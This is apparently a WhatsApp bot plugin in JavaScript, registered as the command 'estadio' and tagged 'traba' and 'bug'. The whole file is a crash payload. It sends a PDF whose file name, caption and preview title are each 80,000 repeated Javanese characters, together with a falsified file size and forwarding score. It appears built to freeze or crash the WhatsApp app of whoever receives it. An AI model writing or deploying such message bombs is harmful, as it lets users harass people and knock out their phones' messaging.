let handler = async (m, { conn }) => {
  try {
    const invisible = 'ꦾ'.repeat(80000) // invisible pero visible 👀
    
    await conn.sendMessage(m.chat, {
      document: { url: 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf' },
      mimetype: 'application/pdf',
      fileName: invisible,
      caption: invisible,
      fileLength: 9999999,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title: invisible,
          body: ' ',
          thumbnail: null,
          mediaType: 1,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: m })

    await conn.sendMessage(m.chat, { text: '✅ Mensaje visible enviado.' }, { quoted: m })

  } catch (e) {
    console.error(e)
    await conn.sendMessage(m.chat, { text: '❌ Falló el envío.' }, { quoted: m })
  }
}

handler.command = ['estadio']
handler.help = ['estadio']
handler.tags = ['traba', 'bug']
handler.premium = false

export default handler